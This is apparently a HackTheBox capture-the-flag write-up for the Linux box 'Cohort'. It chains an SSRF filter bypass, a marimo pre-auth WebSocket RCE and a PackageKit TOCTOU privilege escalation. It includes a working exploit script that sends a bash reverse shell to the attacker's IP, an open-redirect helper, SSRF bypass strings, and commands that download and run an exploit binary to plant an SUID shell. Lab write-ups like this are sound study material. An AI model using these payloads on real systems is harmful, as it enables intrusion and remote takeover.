# Cohort — HackTheBox Writeup
**Difficulty:** Easy | **OS:** Linux

---

## Overview

Cohort is an Easy Linux box that chains two CVEs through an SSRF. The attack runs: SSRF filter bypass → internal service discovery → marimo pre-auth RCE via an unauthenticated WebSocket terminal (CVE-2026-39987) → user flag → PackageKit TOCTOU LPE (CVE-2026-41651) → root. Each step is clean but the SSRF bypass and the vhost discovery have a couple of non-obvious quirks.

**Machine IP:** 10.129.2.10
**My IP:** 10.10.16.86
**User flag:** 742d9b37cd56b755b05884a10466cd75
**Root flag:** cbc1adb617443fe59420c561564ef93c

---

## Recon

```bash
nmap -A -T4 -p- --min-rate 5000 -v 10.129.2.10 -oN scans.txt
```

Only three ports: 22, 80 (redirects to HTTPS), 443. The SSL cert leaks a wildcard SAN (`*.cohort.htb`) so virtual host routing is almost certain.

```bash
echo "10.129.2.10 cohort.htb" | sudo tee -a /etc/hosts
```

Subdomain fuzz with wordlists returns nothing — the interesting subdomains use randomly generated hex IDs, won't appear in any list.

---

## Web Enumeration

`https://cohort.htb/` is a "Register a report source URL" form. The server fetches whatever URL you give it and returns the body in a preview panel. The page explicitly warns that internal and loopback addresses are rejected — so SSRF is the intended path.

Quick callback test confirms outbound requests with response reflection:

```bash
sudo python3 -m http.server 80
# submit http://10.10.16.86/test.csv in the form
# server fetches it and shows the response
```

Confirmed SSRF.

---

## SSRF Filter Bypass — 0.0.0.0

The blocklist filters `127.0.0.1` and `localhost` but misses `0.0.0.0`, which resolves to the loopback interface on Linux:

| URL | Result |
|-----|--------|
| `http://127.0.0.1/` | Blocked |
| `http://localhost/` | Blocked |
| `http://0.0.0.0/` | Returns the internal Cohort SPA |

All internal probing uses `http://0.0.0.0:<port>/` from here.

---

## Internal Service Discovery

Sweeping common ports through the SSRF:

```
http://0.0.0.0:5000/  →  {"ok": false, "message": "Method not allowed."}
http://[::ffff:7f00:1]:8888/api/version  →  0.20.4
```

Port 5000 is an internal API that only accepts POST — dead end for a GET-only SSRF. Port 8888 is **marimo 0.20.4**, a reactive Python notebook server. This version is vulnerable to CVE-2026-39987.

---

## Redirect-Based Filter Bypass

The SSRF fetcher follows 302 redirects without re-validating the destination against the filter. Run a redirector on Kali:

```bash
sudo fuser -k 80/tcp 2>/dev/null
python3 -c '
import http.server, socketserver, urllib.parse
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        q = urllib.parse.urlparse(self.path).query
        t = urllib.parse.parse_qs(q).get("t",[""])[0]
        self.send_response(302)
        self.send_header("Location", t)
        self.end_headers()
    def log_message(self,*a): pass
socketserver.TCPServer(("0.0.0.0",80),H).serve_forever()
'
```

Now any internal URL is reachable:

```
http://10.10.16.86/?t=http://127.0.0.1:8888/api/version
# returns: 0.20.4
```

Probing marimo's auth status:
```
http://10.10.16.86/?t=http://127.0.0.1:8888/api/status
# {"detail":"Authorization header required"}
```

The regular API is auth-gated. The `/terminal/ws` WebSocket endpoint is not — that's the CVE.

---

## vhost Discovery — nginx Proxy to marimo

The Discord channel for the box leaked the `nb-*` subdomain pattern. nginx routes `nb-<hexid>.cohort.htb` directly to internal marimo on `:8888`, including WebSocket upgrades. This means we can hit `/terminal/ws` directly without needing to tunnel through the SSRF.

```bash
echo "10.129.2.10 nb-1be3782a8afd3ad5.cohort.htb" | sudo tee -a /etc/hosts
curl -ski https://nb-1be3782a8afd3ad5.cohort.htb/api/version
# 0.20.4
```

We now have a direct `wss://` path to the vulnerable endpoint.

---

## Foothold — CVE-2026-39987 (marimo Pre-Auth RCE)

The `/terminal/ws` WebSocket endpoint in marimo ≤ 0.20.4 skips authentication entirely and forks a PTY shell directly. The regular `/ws` endpoint correctly validates auth; `/terminal/ws` doesn't. nginx proxies the WebSocket upgrade through from the external interface, so we just connect directly.

```bash
cat > exploit.py << 'EOF2'
import websocket, time

ws = websocket.WebSocket(sslopt={"cert_reqs": 0})
ws.connect("wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws")
print("[+] connected")
time.sleep(2)

ws.settimeout(2)
try:
    while True:
        ws.recv()
except:
    pass

ws.send("bash -c 'bash -i >& /dev/tcp/10.10.16.86/9001 0<&1 2>&1'\n")
time.sleep(20)
ws.close()
EOF2
```

```bash
# terminal 1
rlwrap nc -lvnp 9001

# terminal 2
python3 exploit.py
```

Shell as `marimo`. Stabilise:

```bash
script -qc /bin/bash /dev/null
export TERM=xterm
```

---

## User Flag

```bash
cat ~/user.txt
742d9b37cd56b755b05884a10466cd75
```

---

## Privilege Escalation — CVE-2026-41651 (PackageKit TOCTOU LPE)

PackageKit 1.2.8 is running (vulnerable range: 1.0.2–1.3.4). The TOCTOU chains three bugs:

1. `InstallFiles()` unconditionally overwrites `cached_transaction_flags` and `cached_full_paths` with no state check
2. `pk_transaction_set_state()` silently drops backward state transitions — flags already overwritten, state unchanged
3. `pk_transaction_run()` reads the cached flags at GLib idle dispatch time, not at authorization time

Setting `PK_TRANSACTION_FLAG_SIMULATE` (0x4) skips polkit entirely. The attack:

1. `InstallFiles(SIMULATE, dummy.deb)` → polkit skipped → state = READY → GLib idle queued
2. `InstallFiles(NONE, payload.deb)` → flags/paths overwritten before idle fires
3. GLib idle dispatches → reads overwritten NONE flags + payload path → dpkg installs payload as root
4. Payload `postinst` runs `chmod +s /bin/bash`

**On Kali:**
```bash
git clone https://github.com/Vozec/CVE-2026-41651
cd CVE-2026-41651
python3 -m http.server 8888
```

**On target:**
```bash
cd /tmp
curl http://10.10.16.86:8888/cve-2026-41651 -o cve-2026-41651
chmod +x cve-2026-41651
./cve-2026-41651
```

The `polkit NOT_AUTHORIZED` error in the output is expected — dpkg has already installed the payload by then.

```bash
/tmp/.suid_bash -p
id
# uid=1000(marimo) gid=1000(marimo) euid=0(root)
```

---

## Root Flag

```bash
cat /root/root.txt
cbc1adb617443fe59420c561564ef93c
```

---

## Things I Learned

**SSRF blocklists always have gaps** — `0.0.0.0` resolving to loopback on Linux is the classic miss. If you're blocked on `127.0.0.1` and `localhost`, try `0.0.0.0`, `0x7f000001`, `127.1`, `[::1]`, `[::ffff:127.0.0.1]`. Always have at least five bypass candidates before moving on.

**302 redirects bypass URL validation** — when the SSRF fetcher follows redirects without re-checking the target, you get a clean proxy to any internal address. Always test this as soon as you confirm SSRF.

**Notebook servers are RCE by design** — marimo, Jupyter, and anything that runs code needs auth on every endpoint, including WebSocket terminals. The CVE was just a missing auth check on one route. Internal-only binding isn't a substitute.

**PackageKit TOCTOU is subtle** — the polkit error that appears mid-exploit looks like a failure but it's actually part of the working chain. The race is about which flags get dispatched, not whether polkit approves. Reading the source to understand what each step actually does (vs what the output implies) is what makes this chain make sense.

---

*Pexpo | HTB | 02 Aug 2026*
